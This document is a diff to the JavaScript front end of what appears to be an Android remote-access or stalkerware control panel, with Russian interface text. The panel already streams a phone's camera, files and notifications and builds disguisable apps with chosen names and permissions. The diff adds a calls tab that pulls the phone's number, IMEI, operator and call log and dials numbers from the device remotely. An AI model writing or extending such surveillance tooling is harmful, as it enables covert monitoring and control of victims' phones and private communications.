@@ -65,6 +65,7 @@ document.querySelectorAll('.tab').forEach((tab) => {
     if (tab.dataset.tab === 'files') loadFiles($('#filePath').value);
     if (tab.dataset.tab === 'notifs') loadNotifs();
     if (tab.dataset.tab === 'camera') startCameraView();
+    if (tab.dataset.tab === 'calls') startCallsTab();
   };
 });
 
@@ -472,6 +473,7 @@ $('#buildBtn').onclick = async () => {
   if ($('#permMic').checked) perms.push('RECORD_AUDIO');
   if ($('#permScreen').checked) perms.push('SCREEN');
   if ($('#permNotif').checked) perms.push('NOTIFICATIONS');
+  if ($('#permPhone').checked) perms.push('PHONE');
   const fd = new FormData();
   fd.append('appName', $('#bAppName').value);
   fd.append('applicationId', $('#bAppId').value);
@@ -684,6 +686,95 @@ async function loadNotifs() {
 $('#refreshNotifs').onclick = loadNotifs;
 $('#postNotif').onclick = () => jpost('notifications/post', { title: $('#notifTitle').value, text: $('#notifText').value })
   .then(() => toast('Отправлено')).catch((e) => toast(e.message, true));
+
+// ---------- Звонки / Телефон ----------
+let wsPhone = null;
+
+function startCallsViewer() {
+  if (wsPhone && wsPhone.readyState < 2) return;
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  wsPhone = new WebSocket(`${proto}://${location.host}/phone?role=viewer`);
+  wsPhone.onopen = () => {
+    $('#callsStatus').textContent = 'ожидание телефона…';
+    $('#callsStatus').classList.remove('on');
+  };
+  wsPhone.onmessage = (ev) => {
+    if (typeof ev.data !== 'string') return;
+    try {
+      const m = JSON.parse(ev.data);
+      if (m.type === 'phone-connected') {
+        if (m.connected) {
+          $('#callsStatus').textContent = 'подключён';
+          $('#callsStatus').classList.add('on');
+        } else {
+          $('#callsStatus').textContent = 'телефон не подключён';
+          $('#callsStatus').classList.remove('on');
+        }
+      } else if (m.type === 'phone-info') {
+        renderPhoneInfo(m);
+      } else if (m.type === 'call-log') {
+        renderCallLog(m.entries || []);
+      } else if (m.type === 'call-log-error') {
+        $('#callLogBody').innerHTML = `<tr><td colspan="4" style="color:var(--danger)">${m.msg || 'Ошибка'}</td></tr>`;
+      }
+    } catch {}
+  };
+  wsPhone.onclose = () => {
+    $('#callsStatus').textContent = 'нет соединения';
+    $('#callsStatus').classList.remove('on');
+    setTimeout(startCallsViewer, 3000);
+  };
+  wsPhone.onerror = () => {};
+}
+
+function renderPhoneInfo(info) {
+  $('#callsStatus').textContent = 'подключён';
+  $('#callsStatus').classList.add('on');
+  const rows = [];
+  if (info.model) rows.push(`<b>Модель</b><span>${info.model}</span>`);
+  if (info.number) rows.push(`<b>Номер</b><span>${info.number}</span>`);
+  if (info.imei) rows.push(`<b>IMEI</b><span>${info.imei}</span>`);
+  if (info.operator) rows.push(`<b>Оператор</b><span>${info.operator}</span>`);
+  if (info.simOperator && info.simOperator !== info.operator) rows.push(`<b>SIM</b><span>${info.simOperator}</span>`);
+  if (info.networkType) rows.push(`<b>Сеть</b><span>${info.networkType}</span>`);
+  $('#phoneInfoKv').innerHTML = rows.length ? rows.join('') : '—';
+}
+
+function renderCallLog(entries) {
+  const tbody = $('#callLogBody');
+  if (!entries.length) {
+    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--muted)">Журнал пуст</td></tr>';
+    return;
+  }
+  tbody.innerHTML = entries.map((e) => {
+    const typeLabel = e.callType === 'incoming' ? '📥 Вход'
+      : e.callType === 'outgoing' ? '📤 Исход'
+      : e.callType === 'missed' ? '📵 Пропущен' : '— Другое';
+    const name = e.name ? `${e.name}<small>${e.number}</small>` : e.number || '—';
+    const date = e.date ? new Date(e.date).toLocaleString('ru-RU', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : '';
+    const dur = e.duration > 0 ? `${Math.floor(e.duration / 60)}:${String(e.duration % 60).padStart(2, '0')}` : '—';
+    return `<tr><td class="type-${e.callType}">${typeLabel}</td><td>${name}</td><td>${date}</td><td>${dur}</td></tr>`;
+  }).join('');
+}
+
+function phoneSend(obj) {
+  if (wsPhone && wsPhone.readyState === WebSocket.OPEN) wsPhone.send(JSON.stringify(obj));
+}
+
+function startCallsTab() {
+  startCallsViewer();
+  phoneSend({ cmd: 'get-phone-info' });
+  phoneSend({ cmd: 'get-call-log' });
+}
+
+$('#callBtn').onclick = () => {
+  const num = $('#dialInput').value.trim();
+  if (!num) { toast('Введи номер', true); return; }
+  phoneSend({ cmd: 'call', number: num });
+  toast('Звонок отправлен на телефон');
+};
+$('#dialInput').addEventListener('keydown', (e) => { if (e.key === 'Enter') $('#callBtn').click(); });
+$('#refreshCallLog').onclick = () => phoneSend({ cmd: 'get-call-log' });
 
 // ---------- Старт ----------
 loadDashboard();
